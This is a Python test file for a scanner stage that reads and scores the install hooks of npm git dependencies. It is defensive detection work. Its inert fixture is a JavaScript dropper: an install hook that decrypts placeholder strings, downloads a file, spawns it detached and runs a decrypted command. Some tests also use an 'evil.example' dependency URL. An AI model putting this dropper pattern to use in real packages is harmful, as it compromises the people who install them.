"""Stage 4 reads the install code of git dependencies (decision 0020): resolved through the
repository's refs, fetched through the run's fetcher, analysed with the install rules, scored
like the release's own install code. The fixtures are inert text with the shape of the
`web3-mev-error-decoder` dependency (an `install` hook that decrypts strings, downloads a file
and starts it); nothing here is ever run."""

import json
from datetime import UTC, datetime
from pathlib import Path

import httpx
import pytest

from conftest import Disk, Router, TarEntry, make_tar_gz
from kitsunox.core.models import (
    Candidate,
    Change,
    Evidence,
    EvidenceKind,
    Finding,
    PackageVersionRef,
    PublishInfo,
    Severity,
    StageDecision,
    VersionSnapshot,
)
from kitsunox.ecosystems.npm.gitdep import github_spec
from kitsunox.stages.correlate import (
    CORRELATE_INFO,
    NOT_EVALUATED,
    CorrelationContext,
    correlate_run,
    dependency_subject,
    explained,
)
from kitsunox.stages.gitdeps import (
    GITHUB_OTHER,
    NOT_GITHUB,
    URL_NOT_FETCHED,
    NpmGitDependencyLookup,
    analyse,
    read_dependency,
    wanted,
)
from kitsunox.stages.ingest import write_jsonl
from kitsunox.stages.repo import compare_pool
from kitsunox.stages.review import CORRELATION_RULES
from kitsunox.util import disk
from kitsunox.util.disk import DiskSpaceError
from kitsunox.util.http import BlobStore, FetchMode, HttpFetcher, RetryPolicy, Snapshot

A, B = "a" * 40, "b" * 40
CTX = CorrelationContext(as_of=datetime(2026, 11, 9, tzinfo=UTC))
ATTEMPTS = 2

# Inert: placeholders where the real dependency had encrypted URLs and commands.
HANDLERS = b"""import { spawn, execSync } from 'child_process';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import * as crypto from 'crypto';
const REF_ENDPOINT = 'AAAAAAAAAAAAAAAAAAAAAA==';
const REF_HOSTCMD = 'BBBBBBBBBBBBBBBBBBBBBB==';
function materialize(v) {
    const key = crypto.createHash('sha256').update('placeholder').digest();
    const d = crypto.createDecipheriv('aes-256-cbc', key, Buffer.alloc(16));
    return Buffer.concat([d.update(Buffer.from(v, 'base64')), d.final()]).toString('utf8');
}
async function fetchPayload(url, dest) {
    const res = await globalThis.fetch(url);
    await fs.promises.writeFile(dest, Buffer.from(await res.arrayBuffer()));
}
async function run() {
    const dest = path.join(os.tmpdir(), 'placeholder.bin');
    await fetchPayload(materialize(REF_ENDPOINT), dest);
    spawn(dest, [], { detached: true, stdio: 'ignore' }).unref();
    execSync(materialize(REF_HOSTCMD), { stdio: 'ignore' });
}
run();
"""
DECODER = {
    "package.json": json.dumps(
        {
            "name": "inert-decoder",
            "version": "0.1.0",
            "scripts": {"build": "tsc", "install": "node dist/handlers.js"},
            "devDependencies": {"typescript": "^5"},
        }
    ).encode(),
    "dist/handlers.js": HANDLERS,
    "src/handlers.ts": b"export {};\n",
}


def pkt(text: str) -> bytes:
    return f"{len(text) + 4:04x}".encode() + text.encode()


def refs_url(repo: str) -> str:
    return f"https://github.com/{repo}.git/info/refs?service=git-upload-pack"


def archive_url(repo: str, commit: str) -> str:
    return f"https://codeload.github.com/{repo}/tar.gz/{commit}"


def serve_repo(
    router: Router, repo: str, files: dict[str, bytes], commit: str = A, *, refs: str = ""
) -> None:
    router.add_bytes(
        refs_url(repo), pkt(f"{commit} HEAD\0symref=HEAD:refs/heads/main\n") + pkt(refs) + b"0000"
    )
    name = repo.rsplit("/", 1)[1]
    router.add_bytes(
        archive_url(repo, commit),
        make_tar_gz(TarEntry(f"{name}-{commit}/{p}", c) for p, c in files.items()),
    )


def release(
    deps: dict[str, str], *, name: str = "web3-kx", previous: dict[str, str] | None = None
) -> Candidate:
    def snap(version: str, dependencies: dict[str, str]) -> VersionSnapshot:
        return VersionSnapshot(
            ref=PackageVersionRef(ecosystem="npm", name=name, version=version),
            publish=PublishInfo(),
            manifest={"name": name, "version": version, "dependencies": dependencies},
        )

    change = Change(
        new=snap("0.1.1", deps), previous=snap("0.1.0", previous) if previous is not None else None
    )
    decision = StageDecision(stage="triage", forwarded=False, reason="no signal")
    return Candidate(change=change, history=(decision,))


def fetcher(tmp_path: Path, client: httpx.Client, snapshot: Snapshot | None = None) -> HttpFetcher:
    return HttpFetcher(
        store=BlobStore(tmp_path / "blobs"),
        snapshot=snapshot if snapshot is not None else Snapshot(),
        mode=FetchMode.RECORD if snapshot is None else FetchMode.REPLAY,
        immutable_index=tmp_path / "index",
        client=client,
        retry=RetryPolicy(max_attempts=ATTEMPTS),
    )


def run_all(
    tmp_path: Path,
    candidates: list[Candidate],
    client: httpx.Client,
    *,
    snapshot: Snapshot | None = None,
    cap: int | None = 200,
    pool: bool = False,
    run: str = "run",
) -> tuple[tuple[Candidate, ...], Snapshot]:
    run_dir = tmp_path / run
    run_dir.mkdir(parents=True, exist_ok=True)
    write_jsonl(run_dir / "triage.jsonl", candidates)
    (run_dir / "ast.jsonl").write_bytes(b"")
    http = fetcher(tmp_path, client, snapshot)
    if pool:
        with compare_pool() as workers:
            sources = NpmGitDependencyLookup(http, pool=workers, cap=cap)
            results = tuple(correlate_run(run_dir, CTX, CORRELATION_RULES, sources=sources))
    else:
        sources = NpmGitDependencyLookup(http, cap=cap)
        results = tuple(correlate_run(run_dir, CTX, CORRELATION_RULES, sources=sources))
    http.close()
    return results, http.snapshot


def info(tmp_path: Path) -> dict[str, object]:
    found = json.loads((tmp_path / "run" / CORRELATE_INFO).read_bytes())["git_dependencies"]
    assert isinstance(found, dict)
    return found


def rules(candidate: Candidate) -> dict[str, Severity]:
    out: dict[str, Severity] = {}
    for f in candidate.findings:
        if f.severity is not Severity.INFO:
            out[f.rule_id] = max(
                out.get(f.rule_id, f.severity), f.severity, key=list(Severity).index
            )
    return out


def offline() -> httpx.Client:
    def refuse(request: httpx.Request) -> httpx.Response:
        raise AssertionError(f"replay went to the network: {request.url}")

    return httpx.Client(transport=httpx.MockTransport(refuse))


def test_a_git_dependency_install_hook_is_read_and_reported(tmp_path: Path, router: Router) -> None:
    serve_repo(router, "outgoing/decoder", DECODER)
    candidate = release({"decoder": "github:outgoing/decoder"})
    (result,), snapshot = run_all(tmp_path, [candidate], router.client())
    decision = result.history[-1]
    assert decision.forwarded
    assert "npm.install-hook" in decision.reason and "npm.install-script-code" in decision.reason
    prefix = f"dep:decoder@{A[:12]}/"
    hook = next(f for f in result.findings if f.rule_id == "npm.install-hook")
    assert hook.severity is Severity.MEDIUM and hook.weight == 5.0
    assert hook.evidence[0].path == f"{prefix}package.json:scripts.install"
    assert hook.explanation.startswith("Git dependency `decoder` (outgoing/decoder at aaaaaaaaaaaa")
    code = next(f for f in result.findings if f.rule_id == "npm.install-script-code")
    assert {e.path for e in code.evidence} == {f"{prefix}dist/handlers.js"}
    summary = next(f for f in result.findings if f.rule_id == "npm.git-dependency")
    snippets = " ".join(e.snippet or "" for e in summary.evidence)
    for shown in (
        "[network]",
        "[process]",
        "[filesystem]",
        "[decrypt] const d = crypto.createDecipheriv",
        "[download] async function fetchPayload(url, dest)",
        "[write] await fs.promises.writeFile(dest",
        "[start] spawn(dest, [], { detached: true",
    ):
        assert shown in snippets
    assert "npm runs its `install` at install" in summary.explanation
    assert info(tmp_path)["read"] == 1
    # Replayed from the run's snapshot: byte for byte, without the network.
    again, _ = run_all(tmp_path, [candidate], offline(), snapshot=snapshot, run="replay")
    assert again[0].model_dump_json() == result.model_dump_json()


def test_the_same_code_in_a_pool_worker(tmp_path: Path, router: Router) -> None:
    serve_repo(router, "outgoing/decoder", DECODER)
    candidate = release({"decoder": "github:outgoing/decoder"})
    threads, _ = run_all(tmp_path / "t", [candidate], router.client())
    pooled, _ = run_all(tmp_path / "p", [candidate], router.client(), pool=True)
    assert pooled[0].model_dump_json() == threads[0].model_dump_json()


def test_prepare_runs_for_a_git_dependency(tmp_path: Path, router: Router) -> None:
    files = {
        "package.json": json.dumps(
            {"name": "d", "scripts": {"prepare": "npm run build", "build": "node scripts/b.js"}}
        ).encode(),
        "scripts/b.js": b"require('https').get('https://example.invalid/x');\n",
    }
    serve_repo(router, "o/d", files)
    (result,), _ = run_all(tmp_path, [release({"d": "o/d"})], router.client())
    hook = next(f for f in result.findings if f.rule_id == "npm.install-hook")
    assert hook.evidence[0].path == f"dep:d@{A[:12]}/package.json:scripts.prepare"
    assert hook.evidence[0].after == "node scripts/b.js"  # `npm run build`, expanded
    assert "npm runs the dependency's `prepare` when it installs it from git" in hook.explanation
    code = next(f for f in result.findings if f.rule_id == "npm.install-script-code")
    assert code.evidence[0].path == f"dep:d@{A[:12]}/scripts/b.js"


def test_an_archive_url_runs_only_the_install_hooks(tmp_path: Path, router: Router) -> None:
    files = {
        "package.json": json.dumps({"name": "d", "scripts": {"prepare": "node x.js"}}).encode()
    }
    serve_repo(router, "o/d", files)
    spec = f"https://codeload.github.com/o/d/tar.gz/{A}"
    (result,), _ = run_all(tmp_path, [release({"d": spec})], router.client())
    assert "npm.install-hook" not in rules(result)
    summary = next(f for f in result.findings if f.rule_id == "npm.git-dependency")
    assert "npm runs none of its scripts at install" in summary.explanation


def test_an_unreadable_dependency_keeps_today_s_finding_and_a_note(
    tmp_path: Path, router: Router
) -> None:
    router.add_bytes(refs_url("o/gone"), b"", status=404)
    serve_repo(router, "o/d", DECODER)
    candidates = [
        release({"gone": "github:o/gone"}, name="a"),
        release({"d": "github:o/d#v9"}, name="b"),  # no such tag
        release({"lab": "git+https://gitlab.com/o/r.git"}, name="c"),
        release({"t": "https://evil.example/x.tgz"}, name="e"),
        release({"asset": "https://github.com/o/d/releases/download/v1/x.tgz"}, name="f"),
    ]
    results, _ = run_all(tmp_path, candidates, router.client())
    notes = []
    for result in results:
        assert rules(result) == {}  # nothing beyond Stage 1 (not run here): only a note
        (note,) = (f for f in result.findings if f.rule_id == "npm.git-dependency")
        assert note.explanation.startswith(NOT_EVALUATED)
        notes.append(note.explanation)
    assert "repository o/gone not found" in notes[0]
    assert "`v9` not found in o/d" in notes[1]
    assert NOT_GITHUB in notes[2] and URL_NOT_FETCHED in notes[3] and GITHUB_OTHER in notes[4]
    assert not any("evil.example" in url or "gitlab" in url for url in router.requests)


def test_a_network_failure_is_retried_then_noted(tmp_path: Path, router: Router) -> None:
    serve_repo(router, "o/d", DECODER)
    url = archive_url("o/d", A)
    left = {"n": ATTEMPTS}  # the first pass's attempts fail; the retry pass succeeds

    def handle(request: httpx.Request) -> httpx.Response:
        if str(request.url) == url and left["n"] > 0:
            left["n"] -= 1
            return httpx.Response(503)
        return router.handler(request)

    client = httpx.Client(transport=httpx.MockTransport(handle))
    (result,), _ = run_all(tmp_path, [release({"d": "o/d"})], client)
    assert "npm.install-script-code" in rules(result)
    assert info(tmp_path)["first_pass"] == 1 and info(tmp_path)["still_failing"] == 0

    down = httpx.Client(transport=httpx.MockTransport(lambda r: httpx.Response(503)))
    (failed,), _ = run_all(tmp_path / "down", [release({"d": "o/d"})], down)
    (note,) = (f for f in failed.findings if f.rule_id == "npm.git-dependency")
    assert note.explanation.startswith(NOT_EVALUATED) and "network:" in note.explanation
    assert info(tmp_path / "down")["still_failing"] == 1


def test_only_added_or_changed_dependencies_are_read(tmp_path: Path, router: Router) -> None:
    serve_repo(router, "o/d", DECODER)
    same = release({"d": "o/d"}, previous={"d": "o/d"})
    assert wanted(same.change) == []
    (result,), _ = run_all(tmp_path, [same], router.client())
    assert router.requests == [] and not any(
        f.rule_id == "npm.git-dependency" for f in result.findings
    )
    local = release({"a": "file:../a", "b": "^1", "c": "https://registry.npmjs.org/c/-/c-1.tgz"})
    assert wanted(local.change) == []


def test_a_commit_bump_is_compared_with_the_pinned_commit(tmp_path: Path, router: Router) -> None:
    serve_repo(router, "o/d", DECODER, A)
    router.add_bytes(
        archive_url("o/d", B),
        make_tar_gz(TarEntry(f"d-{B}/{p}", c) for p, c in DECODER.items()),
    )
    bump = release({"d": f"github:o/d#{A}"}, previous={"d": f"github:o/d#{B}"})
    (result,), _ = run_all(tmp_path, [bump], router.client())
    # The same install code as at the commit the previous release pinned: nothing new runs.
    assert "npm.install-script-code" not in rules(result)
    assert "npm.install-hook" not in rules(result)
    summary = next(f for f in result.findings if f.rule_id == "npm.git-dependency")
    assert f"compared with {B[:12]}, the commit the previous release pinned" in summary.explanation


def test_the_run_cap_is_deterministic(tmp_path: Path, router: Router) -> None:
    serve_repo(router, "o/d", DECODER)
    serve_repo(router, "o/e", DECODER)
    candidates = [release({"d": "o/d"}, name="first"), release({"e": "o/e"}, name="second")]
    results, _ = run_all(tmp_path, candidates, router.client(), cap=1)
    assert "npm.install-script-code" in rules(results[0])
    (note,) = (f for f in results[1].findings if f.rule_id == "npm.git-dependency")
    assert "over the run's git dependency cap" in note.explanation
    assert not any("o/e" in url for url in router.requests)
    assert info(tmp_path)["capped"] == 1


def test_credentials_in_a_spec_are_never_sent_or_shown(tmp_path: Path, router: Router) -> None:
    serve_repo(router, "o/d", DECODER)
    spec = "git+https://ghp_notarealtoken@github.com/o/d.git"
    (result,), _ = run_all(tmp_path, [release({"d": spec})], router.client())
    assert "npm.install-script-code" in rules(result)
    assert all("ghp_" not in url for url in router.requests)
    git_findings = [f for f in result.findings if f.rule_id == "npm.git-dependency"]
    assert git_findings and all("ghp_" not in f.model_dump_json() for f in git_findings)


def test_nested_git_dependencies_are_noted_not_followed(tmp_path: Path, router: Router) -> None:
    manifest = json.loads(DECODER["package.json"])
    manifest["dependencies"] = {"next": "github:o/next", "ok": "^1"}
    serve_repo(router, "o/d", {**DECODER, "package.json": json.dumps(manifest).encode()})
    (result,), _ = run_all(tmp_path, [release({"d": "o/d"})], router.client())
    (nested,) = (f for f in result.findings if "not read: `next: github:o/next`" in f.explanation)
    assert nested.severity is Severity.INFO
    assert not any("o/next" in url for url in router.requests)


def finding(rule: str, severity: Severity, path: str) -> Finding:
    return Finding(
        rule_id=rule,
        rule_version=1,
        severity=severity,
        weight=5.0 if severity is Severity.MEDIUM else 0.0,
        title=rule,
        explanation="x",
        evidence=(Evidence(kind=EvidenceKind.MANIFEST_FIELD, path=path),),
    )


def test_an_explanation_applies_only_within_its_subject() -> None:
    dep = f"dep:d@{A[:12]}/package.json:scripts.install"
    own_build_tool = finding(
        "npm.install-build-tool", Severity.INFO, "package.json:scripts.install"
    )
    dep_hook = finding("npm.install-hook", Severity.MEDIUM, dep)
    own_hook = finding("npm.install-hook", Severity.MEDIUM, "package.json:scripts.install")
    assert dependency_subject(dep_hook) == f"dep:d@{A[:12]}/"
    assert dependency_subject(own_hook) == ""
    out = explained([own_build_tool, dep_hook, own_hook])
    assert out[1].severity is Severity.MEDIUM  # the package's build tool says nothing of it
    assert out[2].severity is Severity.LOW
    dep_build_tool = finding("npm.install-build-tool", Severity.INFO, dep)
    out = explained([dep_build_tool, dep_hook, own_hook])
    assert (out[1].severity, out[2].severity) == (Severity.LOW, Severity.MEDIUM)


def test_a_build_tool_prepare_is_explained_within_the_dependency() -> None:
    spec = github_spec("github:o/d")
    assert spec is not None
    files = read_dependency(
        {
            "package.json": json.dumps(
                {"name": "d", "scripts": {"prepare": "husky install"}}
            ).encode()
        },
        spec,
    )
    findings, _ = analyse(files, A)
    hook = next(f for f in findings if f.rule_id == "npm.install-hook")
    assert hook.severity is Severity.LOW and "npm.install-build-tool" in hook.explanation


def test_a_full_disk_is_never_taken_for_an_unreadable_dependency(
    tmp_path: Path, router: Router, free_disk: Disk
) -> None:
    serve_repo(router, "o/d", DECODER)
    run_dir = tmp_path / "run"
    run_dir.mkdir()
    write_jsonl(run_dir / "triage.jsonl", [release({"d": "o/d"})])
    (run_dir / "ast.jsonl").write_bytes(b"")
    http = HttpFetcher(
        store=BlobStore(tmp_path / "blobs", min_free=disk.BLOB_FLOOR),
        snapshot=Snapshot(),
        mode=FetchMode.RECORD,
        client=router.client(),
    )
    free_disk.free = 0
    with pytest.raises(DiskSpaceError):
        correlate_run(run_dir, CTX, CORRELATION_RULES, sources=NpmGitDependencyLookup(http))
